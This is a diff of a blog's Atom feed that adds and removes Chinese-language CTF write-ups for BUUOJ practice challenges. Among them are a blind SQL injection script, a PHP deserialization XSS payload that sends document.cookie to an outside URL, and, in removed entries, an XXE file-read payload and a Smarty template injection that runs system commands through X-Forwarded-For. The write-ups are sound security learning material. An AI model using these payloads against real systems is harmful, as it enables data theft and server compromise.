@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://ev11ccaatt.github.io</id>
     <title>ev11ccaatt</title>
-    <updated>2021-03-31T06:16:35.229Z</updated>
+    <updated>2021-04-06T08:25:34.158Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://ev11ccaatt.github.io"/>
     <link rel="self" href="https://ev11ccaatt.github.io/atom.xml"/>
@@ -11,12 +11,124 @@
     <icon>https://ev11ccaatt.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, ev11ccaatt</rights>
     <entry>
-        <title type="html"><![CDATA[check]]></title>
-        <id>https://ev11ccaatt.github.io/post/check/</id>
-        <link href="https://ev11ccaatt.github.io/post/check/">
+        <title type="html"><![CDATA[[BJDCTF 2nd]Schrödinger]]></title>
+        <id>https://ev11ccaatt.github.io/post/bjdctf-2ndschrodinger/</id>
+        <link href="https://ev11ccaatt.github.io/post/bjdctf-2ndschrodinger/">
         </link>
-        <updated>2021-03-31T06:06:21.000Z</updated>
-        <content type="html"><![CDATA[<p>11</p>
+        <updated>2021-04-06T07:53:44.000Z</updated>
+        <content type="html"><![CDATA[<p>进去看了下，貌似要我们把cpu负载给拉低。</p>
+<p>如果check会提示no target。</p>
+<p>看下源码，发现用空白隐藏了个test.php</p>
+<p>是个貌似用来爆破的地方。</p>
+<p>先爆着，但buu导致很慢，就先看看index.php的输入框.</p>
+<pre><code>受害者  victim
+</code></pre>
+<p>那么看看人名有啥，先试试admin.出了两个数值，同时cookie多了个dXNlcg，其值貌似能base解密为 1617696743，那么先测试一下，改成空。</p>
+<p>就会弹出 av11664517@1583985203</p>
+<p>b站评论找到flag.</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[BJDCTF 2nd]elementmaster]]></title>
+        <id>https://ev11ccaatt.github.io/post/bjdctf-2ndelementmaster/</id>
+        <link href="https://ev11ccaatt.github.io/post/bjdctf-2ndelementmaster/">
+        </link>
+        <updated>2021-04-06T07:30:57.000Z</updated>
+        <content type="html"><![CDATA[<p>一进去先看源码，发现两个id有个怪，转成字符串分别是 Po.  php</p>
+<p>拼接起来，返回了个 .</p>
+<p>没思路了</p>
+<p>看了下wp，原来是个元素周期表的东西。</p>
+<pre><code>import requests
+import time
+url = 'http://2244b9bc-a2ba-4aff-8197-a5fac03cc29b.node3.buuoj.cn/'
+element=['H', 'He', 'Li', 'Be', 'B', 'C', 'N', 'O', 'F', 'Ne', 'Na', 'Mg', 'Al', 'Si', 'P', 'S', 'Cl', 'Ar',
+        'K', 'Ca', 'Sc', 'Ti', 'V', 'Cr', 'Mn', 'Fe', 'Co', 'Ni', 'Cu', 'Zn', 'Ga', 'Ge', 'As', 'Se', 'Br',
+        'Kr', 'Rb', 'Sr', 'Y', 'Zr', 'Nb', 'Mo', 'Te', 'Ru', 'Rh', 'Pd', 'Ag', 'Cd', 'In', 'Sn', 'Sb', 'Te',
+        'I', 'Xe', 'Cs', 'Ba', 'La', 'Ce', 'Pr', 'Nd', 'Pm', 'Sm', 'Eu', 'Gd', 'Tb', 'Dy', 'Ho', 'Er', 'Tm',
+        'Yb', 'Lu', 'Hf', 'Ta', 'W', 'Re', 'Os', 'Ir', 'Pt', 'Au', 'Hg', 'Tl', 'Pb', 'Bi', 'Po', 'At', 'Rn',
+        'Fr', 'Ra', 'Ac', 'Th', 'Pa', 'U', 'Np', 'Pu', 'Am', 'Cm', 'Bk', 'Cf', 'Es', 'Fm','Md', 'No', 'Lr',
+        'Rf', 'Db', 'Sg', 'Bh', 'Hs', 'Mt', 'Ds', 'Rg', 'Cn', 'Nh', 'Fl', 'Mc', 'Lv', 'Ts', 'Og', 'Uue']
+flag = &quot;&quot;
+for i in element:
+    time.sleep(0.2) #buu特色
+    r = requests.get(url+i+'.php')
+    if &quot;404&quot; not in r.text:
+        flag+=r.text
+    
+print(flag)
+</code></pre>
+<p>得到一个And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</p>
+<p>访问得到flag.</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[BJDCTF 2nd]xss之光]]></title>
+        <id>https://ev11ccaatt.github.io/post/bjdctf-2ndxss-zhi-guang/</id>
+        <link href="https://ev11ccaatt.github.io/post/bjdctf-2ndxss-zhi-guang/">
+        </link>
+        <updated>2021-04-06T06:58:03.000Z</updated>
+        <content type="html"><![CDATA[<p>进去没有信息，抓个包看下，当时第一是发现 Server: openresty 找了几个payload看了下，貌似不是这里。</p>
+<p>那么还是老办法吧，扫目录。</p>
+<p>开奖了，有git文件泄露.</p>
+<p>发现就一个文件</p>
+<pre><code>&lt;?php
+$a = $_GET['yds_is_so_beautiful'];
+echo unserialize($a);
+</code></pre>
+<p>一番搜索发现是php原生类的利用,<a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">反序列化之PHP原生类的利用</a></p>
+<p>由于是php5.6那么构造</p>
+<pre><code>&lt;?php
+$a = new Exception(&quot;&lt;script&gt;window.open('http://99cb3fc4-b241-4edb-aa24-b550de1ef186.node3.buuoj.cn/?'+document.cookie);&lt;/script&gt;&quot;);
+$b = serialize($a);
+echo urlencode($b);
+</code></pre>
+<p>即可，传入后在cookie可以看到flag.</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[BJDCTF 2nd]简单注入]]></title>
+        <id>https://ev11ccaatt.github.io/post/bjdctf-2ndjian-dan-zhu-ru/</id>
+        <link href="https://ev11ccaatt.github.io/post/bjdctf-2ndjian-dan-zhu-ru/">
+        </link>
+        <updated>2021-04-06T06:35:42.000Z</updated>
+        <content type="html"><![CDATA[<p>进去是个登陆界面，试一下username=amdin，password=1&quot;</p>
+<p>弹出stophacking,那么应该是个注入了。</p>
+<p>这里在passowrd测试了一会，无果，去扫一下目录。</p>
+<p>扫到hint.txt</p>
+<p>给了sql语句</p>
+<pre><code class="language-select"></code></pre>
+<p>这里需要\来转义'从而将$_POST[&quot;password&quot;]释放出来.<br>
+语句会变为</p>
+<pre><code>`select * from users where username=('$_POST[&quot;username&quot;] and password=' )($_POST[&quot;password&quot;]');
+</code></pre>
+<p>这样就可以在password处进行数字注入</p>
+<p>采用二分法</p>
+<pre><code>import requests
+import time
+
+url = 'http://6508e5bd-9f0d-441f-9954-107228bdd7fa.node3.buuoj.cn/index.php'
+flag = &quot;&quot;
+data  ={&quot;username&quot;:&quot;admin\\&quot;,&quot;password&quot;:&quot;&quot;}
+for i in range(1,1000):
+    low = 32
+    high = 128
+    mid = (low+high) // 2
+    while(low&lt;high):
+        time.sleep(0.2)
+        payload = &quot;or/**/if(ascii(substr(password,{},1))&gt;{},1,0)#&quot;.format(i,mid)  
+        data['password']=payload
+        r = requests.post(url,data=data).text
+        if &quot;stronger&quot; in r:
+            low = mid + 1
+        else:
+            high = mid
+        mid = (low+high) // 2
+        print(mid)
+    if(mid == 32 or mid ==132):
+        break
+    flag +=chr(mid)
+    print(flag)
+</code></pre>
 ]]></content>
     </entry>
     <entry>
@@ -176,65 +288,6 @@ flag文件是0700权限,咱是读不了的。<br>
 <pre><code>ROT13	xman{oyay_now_you_get_it}
 </code></pre>
 <p>收工，睡觉.</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[CSAWQual 2019]Web_Unagi]]></title>
-        <id>https://ev11ccaatt.github.io/post/csawqual-2019web_unagi/</id>
-        <link href="https://ev11ccaatt.github.io/post/csawqual-2019web_unagi/">
-        </link>
-        <updated>2021-03-24T10:30:06.000Z</updated>
-        <content type="html"><![CDATA[<p>进去先看几个网页，发现flag在/flag</p>
-<p>然后upload页面存在上传。</p>
-<p>细看有个here的超链接。</p>
-<p>点进去一看貌似是xxe执行命令.</p>
-<pre><code>&lt;?xml version='1.0'?&gt;
-&lt;!DOCTYPE users [
-&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;
-&lt;users&gt;
-    &lt;user&gt;
-        &lt;username&gt;bob&lt;/username&gt;
-        &lt;password&gt;passwd2&lt;/password&gt;
-        &lt;name&gt; Bob&lt;/name&gt;
-        &lt;email&gt;bob@fakesite.com&lt;/email&gt;  
-        &lt;group&gt;CSAW2019&lt;/group&gt;
-        &lt;intro&gt;&amp;xxe;&lt;/intro&gt;
-    &lt;/user&gt;
-&lt;/users&gt;
-</code></pre>
-<p>构造尝试读取.</p>
-<p>一上传发现被ban了，考虑转换编码来绕过。 utf-8 -&gt; utf-16.</p>
-<p>成功读取.</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[友链]]></title>
-        <id>https://ev11ccaatt.github.io/post/you-lian/</id>
-        <link href="https://ev11ccaatt.github.io/post/you-lian/">
-        </link>
-        <updated>2021-03-23T10:31:39.000Z</updated>
-        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_51868336">77pray</a></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[CISCN2019 华东南赛区]Web11]]></title>
-        <id>https://ev11ccaatt.github.io/post/ciscn2019-hua-dong-nan-sai-qu-web11/</id>
-        <link href="https://ev11ccaatt.github.io/post/ciscn2019-hua-dong-nan-sai-qu-web11/">
-        </link>
-        <updated>2021-03-23T09:58:56.000Z</updated>
-        <content type="html"><![CDATA[<p>进去先看源代码发现一句</p>
-<pre><code> &lt;p style=&quot;text-align:center;font-size:14px;&quot;&gt;Build With Smarty !&lt;/p&gt;
-</code></pre>
-<p>那么就要测试一下注入点，题目一共提供了三个网址原网址,/api,/xff.</p>
-<p>那么接下来寻找注入点。</p>
-<p>使用tqlmap对三个地址进行测试，均未爆出注入点。</p>
-<p>那么再看看题目，题目中提到X-Forwarded-For，那么注入点会不会存在在这里。</p>
-<p>测试一手XFF={if phpinfo()}{/if} 不用{php}是因为smarty3已废弃{php}标签。</p>
-<p>三个网址均有正确的回显，那么对其继续注入.</p>
-<p>将XFF改为{if system(&quot;ls /&quot;)}{/if}进行测试，只有/api和/xff有正确回显。</p>
-<p>那么读取/flag 即可获得flag.</p>
-<p>这里有多种方法</p>
-<p>system执行系统命令；show_source；readfile；等.</p>
 ]]></content>
     </entry>
 </feed>
